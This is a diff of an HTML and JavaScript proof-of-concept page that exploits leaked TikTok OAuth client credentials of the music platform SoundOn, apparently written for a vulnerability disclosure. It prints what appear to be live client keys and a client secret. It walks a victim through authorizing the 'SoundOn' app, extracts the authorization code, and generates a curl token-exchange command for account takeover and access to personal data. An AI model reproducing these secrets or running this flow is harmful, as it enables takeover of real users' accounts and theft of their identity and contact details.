@@ -3,70 +3,106 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SoundOn — TikTok OAuth PoC</title>
+<title>TikTok OAuth Client Credential Exposure — PoC</title>
 <style>
-body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 40px; max-width: 800px; margin: 0 auto; }
-h2 { color: #fff; border-bottom: 1px solid #333; padding-bottom: 8px; }
-.label { color: #888; }
-.val { color: #ff0; word-break: break-all; }
-.section { background: #111; border: 1px solid #222; border-radius: 8px; padding: 20px; margin: 16px 0; }
-.btn { display: inline-block; background: #fe2c55; color: #fff; border: none; padding: 14px 36px; border-radius: 6px; font-size: 15px; cursor: pointer; text-decoration: none; }
-.btn:disabled { background: #555; cursor: not-allowed; }
-.warn { color: #fe2c55; }
-.success { color: #0f0; }
-textarea { background: #222; color: #fff; border: 1px solid #333; padding: 12px; border-radius: 4px; font-size: 14px; font-family: monospace; width: 100%; height: 80px; }
-.status { margin: 10px 0; padding: 12px; border-radius: 4px; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0a0a0a; color: #fff; }
+.container { max-width: 800px; margin: 0 auto; padding: 40px 20px; }
+h1 { font-size: 24px; margin-bottom: 24px; border-bottom: 1px solid #222; padding-bottom: 16px; }
+h2 { font-size: 18px; margin: 24px 0 12px; color: #aaa; }
+.card { background: #111; border: 1px solid #222; border-radius: 12px; padding: 24px; margin: 16px 0; }
+.row { display: flex; justify-content: space-between; padding: 6px 0; font-size: 13px; font-family: monospace; }
+.row .key { color: #888; }
+.row .val { color: #0f0; word-break: break-all; }
+.btn { display: inline-block; background: #fe2c55; color: #fff; border: none; padding: 14px 40px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; text-decoration: none; }
+.btn:disabled { background: #444; cursor: not-allowed; }
+.btn-outline { background: transparent; border: 1px solid #fe2c55; color: #fe2c55; }
+.step { display: flex; gap: 16px; padding: 16px; background: #1a1a1a; border-radius: 8px; margin: 12px 0; border-left: 3px solid #333; }
+.step.active { border-left-color: #fe2c55; background: #1a1015; }
+.step.done { border-left-color: #0f0; background: #0a1a0a; }
+.step-num { font-size: 24px; font-weight: 700; color: #fe2c55; min-width: 32px; }
+.step.done .step-num { color: #0f0; }
+.step-content { flex: 1; }
+.step-content p { color: #aaa; font-size: 14px; margin-top: 4px; }
+textarea { width: 100%; background: #000; color: #0f0; border: 1px solid #333; border-radius: 8px; padding: 12px; font-size: 12px; font-family: monospace; margin-top: 8px; }
+.status { padding: 16px; border-radius: 8px; margin: 12px 0; text-align: center; font-weight: 600; }
 .status-waiting { background: #1a1a00; border: 1px solid #333; }
-.status-done { background: #001a00; border: 1px solid #0f0; }
+.status-done { background: #0a1a0a; border: 1px solid #0f0; color: #0f0; }
+.curl-box { background: #000; border: 1px solid #333; border-radius: 8px; padding: 16px; overflow-x: auto; white-space: pre-wrap; color: #0ff; font-size: 12px; font-family: monospace; margin-top: 12px; }
+.hidden { display: none; }
 </style>
 </head>
 <body>
-<h1>SoundOn — TikTok OAuth Client Credential Exposure</h1>
+<div class="container">
+<h1>SoundOn TikTok OAuth Credential Exposure — PoC</h1>
 
-<div class="section">
-<h2>Leaked Credentials (from SoundOn JS Bundle)</h2>
-<div><span class="label">Browser client_key:</span> <span class="val">awcdygtcjh22v33k</span> <span class="success">(authorize URL)</span></div>
-<div><span class="label">Server client_key:</span> <span class="val">awulj3e36brrh086</span> <span class="warn">(token exchange)</span></div>
-<div><span class="label">client_secret:</span> <span class="val">e63acb9afab646ee9340f16a2380b1ed</span> <span class="warn">(valid for BOTH keys!)</span></div>
+<div class="card">
+<h2>Leaked Credentials</h2>
+<div class="row"><span class="key">browser client_key:</span><span class="val">awcdygtcjh22v33k</span></div>
+<div class="row"><span class="key">server client_key:</span><span class="val">awulj3e36brrh086</span></div>
+<div class="row"><span class="key">client_secret:</span><span class="val">e63acb9afab646ee9340f16a2380b1ed</span></div>
+<div class="row"><span class="key">source:</span><span class="val">soundon.global → index.24851df7.js + kak.js</span></div>
 </div>
 
-<div class="section">
-<h2>Reproduction Steps</h2>
-<ol>
-<li>Click the button below — a TikTok authorization window will open</li>
-<li>Log into TikTok and authorize "SoundOn"</li>
-<li>TikTok redirects to soundon.global with your authorization code</li>
-<li><strong>Copy the FULL URL</strong> from the browser address bar</li>
-<li><strong>Paste it below</strong> — the attacker can now exchange it for your access token</li>
-</ol>
+<div id="step1" class="step active">
+<div class="step-num">1</div>
+<div class="step-content">
+<strong>Initiate TikTok OAuth Authorization</strong>
+<p>A popup window will open to TikTok's official authorization page. The app appears as "SoundOn" (the legitimate music distribution platform).</p>
+<a class="btn" id="startBtn" onclick="startOAuth()">▶ Start TikTok OAuth</a>
+</div>
 </div>
 
-<div class="section status status-waiting" id="statusBox">
-<strong id="statusText">Waiting for authorization...</strong>
-<p>Step 1: Click the button to open TikTok OAuth in a new window.</p>
+<div id="step2" class="step">
+<div class="step-num">2</div>
+<div class="step-content">
+<strong>Authorize "SoundOn" on TikTok</strong>
+<p>In the popup window, log into TikTok (if not already) and click <strong>Authorize</strong>.</p>
+<p style="color:#fe2c55">After authorizing, TikTok will redirect you to soundon.global with the authorization code in the URL.</p>
+</div>
 </div>
 
-<div class="section">
-<h2>Step 2: Paste the callback URL here</h2>
-<textarea id="urlInput" placeholder="https://www.soundon.global/login/oauth/middle?code=..."></textarea>
-<br><br>
-<div id="codeResult" style="display:none">
-<h2 class="success">&#10004; Authorization Code Extracted</h2>
-<div><span class="label">code:</span> <span class="val" id="codeDisplay"></span></div>
+<div id="step3" class="step">
+<div class="step-num">3</div>
+<div class="step-content">
+<strong>Copy the callback URL</strong>
+<p>After TikTok redirects you to soundon.global, <strong>copy the full URL</strong> from the popup's address bar. It will look like:</p>
+<p style="color:#888;font-size:12px">https://www.soundon.global/login/oauth/middle?code=...</p>
+<textarea id="urlInput" placeholder="Paste the full callback URL here"></textarea>
+</div>
+</div>
+
+<div id="step4" class="step">
+<div class="step-num">4</div>
+<div class="step-content">
+<strong>Token Exchange</strong>
+<p>The attacker uses the leaked client_secret to exchange the authorization code for an access token:</p>
+<div class="curl-box" id="curlCmd">Paste the URL above to generate the command...</div>
+</div>
+</div>
+
+<div id="statusMsg" class="status status-waiting hidden">
+<span id="statusText">Ready to start.</span>
+</div>
+
+<div id="successMsg" class="hidden">
+<div class="card" style="border-color:#0f0">
+<h2 style="color:#0f0">&#10004; PoC Evidence Captured</h2>
+<p>Authorization code extracted. The attacker can now exchange it for a TikTok access token using the leaked client_secret.</p>
 <br>
-<div style="background:#000;border:1px solid #333;border-radius:4px;padding:12px;overflow-x:auto;white-space:pre-wrap;color:#0ff;font-size:13px" id="cmdDisplay"></div>
+<p><strong>Impact:</strong> Account takeover on SoundOn via TikTok OAuth login. Victim PII (name, KTP, phone, email, address) accessible through SoundOn's <code>/api/user</code> endpoint.</p>
 </div>
 </div>
-
-<div class="section">
-<a class="btn" id="startBtn" onclick="startOAuth();return false">▶ Start TikTok OAuth (Opens in New Window)</a>
 </div>
 
 <script>
 const BROWSER_KEY = "awcdygtcjh22v33k";
 const SCOPE = "user.info.basic,user.info.username,music.profile.manage";
-const CALLBACK = "https://www.soundon.global/login/oauth/middle";
+const SOUNDON_CB = "https://www.soundon.global/login/oauth/middle";
 const STATE = "poc_" + Date.now();
+
+let oauthWindow = null;
+let pollTimer = null;
 
 function startOAuth() {
   const url =
@@ -75,37 +111,79 @@ function startOAuth() {
     "&scope=" + SCOPE +
     "&response_type=code" +
     "&lang=en" +
-    "&redirect_uri=" + encodeURIComponent(CALLBACK) +
+    "&redirect_uri=" + encodeURIComponent(SOUNDON_CB) +
     "&state=" + STATE +
     "&prompts=consent";
 
-  document.getElementById("statusText").textContent = "OAuth window opened. Complete authorization on TikTok...";
+  oauthWindow = window.open(url, "tiktok_oauth", "width=600,height=700");
+
   document.getElementById("startBtn").disabled = true;
   document.getElementById("startBtn").textContent = "Waiting for authorization...";
+  document.getElementById("step2").classList.add("active");
 
-  // Open in new window — victim authorizes there, then copies URL
-  window.open(url, "tiktok_oauth", "width=600,height=700");
+  document.getElementById("statusMsg").classList.remove("hidden");
+  document.getElementById("statusMsg").className = "status status-waiting";
+  document.getElementById("statusText").textContent = "Waiting for authorization... Once TikTok redirects you to soundon.global, copy the URL and paste it below.";
+
+  // Poll to detect when popup navigates to soundon.global
+  pollTimer = setInterval(checkPopup, 1500);
 }
 
-// Monitor the URL input for pasted callback URL
-document.getElementById("urlInput").addEventListener("input", function() {
-  const url = this.value.trim();
-  if (!url || !url.includes("code=")) return;
+function checkPopup() {
+  if (!oauthWindow || oauthWindow.closed) {
+    clearInterval(pollTimer);
+    document.getElementById("step2").classList.add("done");
+    document.getElementById("step2").classList.remove("active");
+    document.getElementById("step3").classList.add("active");
+    document.getElementById("statusText").textContent = "Authorization complete! Please copy the URL from the popup window.";
+    document.getElementById("statusMsg").className = "status status-done";
+    return;
+  }
 
   try {
-    const u = new URL(url);
+    // Can't read cross-origin URL, but we can detect if window is still on TikTok
+    if (oauthWindow.location.hostname.includes("soundon.global")) {
+      clearInterval(pollTimer);
+      document.getElementById("step2").classList.add("done");
+      document.getElementById("step2").classList.remove("active");
+      document.getElementById("step3").classList.add("active");
+      document.getElementById("statusText").textContent = "Redirected to soundon.global! Please copy the URL from the popup.";
+      document.getElementById("statusMsg").className = "status status-done";
+    }
+  } catch(e) {
+    // Cross-origin — popup navigated to soundon.global (can't read)
+    // This actually means it DID navigate to soundon.global!
+    clearInterval(pollTimer);
+    document.getElementById("step2").classList.add("done");
+    document.getElementById("step2").classList.remove("active");
+    document.getElementById("step3").classList.add("active");
+    document.getElementById("statusText").textContent = "TikTok redirect complete! The popup is now on soundon.global. Copy the URL and paste below.";
+    document.getElementById("statusMsg").className = "status status-done";
+  }
+}
+
+document.getElementById("urlInput").addEventListener("input", function() {
+  const raw = this.value.trim();
+  if (!raw || !raw.includes("code=")) return;
+
+  try {
+    const u = new URL(raw);
     const code = u.searchParams.get("code");
     if (!code) return;
 
-    document.getElementById("codeResult").style.display = "block";
-    document.getElementById("codeDisplay").textContent = code;
-    document.getElementById("statusText").textContent = "Authorization code captured!";
-    document.getElementById("statusBox").className = "section status status-done";
+    document.getElementById("step3").classList.add("done");
+    document.getElementById("step3").classList.remove("active");
+    document.getElementById("step4").classList.add("active");
+    document.getElementById("successMsg").classList.remove("hidden");
 
-    document.getElementById("cmdDisplay").textContent =
+    document.getElementById("curlCmd").textContent =
+      "# Run this command immediately (codes expire in ~60s):\n" +
       "curl -s 'https://open-api.tiktok.com/oauth/access_token/' \\\n" +
       "  -H 'Content-Type: application/json' \\\n" +
       "  -d '{\"client_key\":\"awcdygtcjh22v33k\",\"client_secret\":\"e63acb9afab646ee9340f16a2380b1ed\",\"code\":\"" + code + "\",\"grant_type\":\"authorization_code\"}'";
+
+    document.getElementById("statusText").textContent = "Code captured! Run the curl command immediately.";
+    document.getElementById("statusMsg").className = "status status-done";
   } catch(e) {}
 });
 </script>
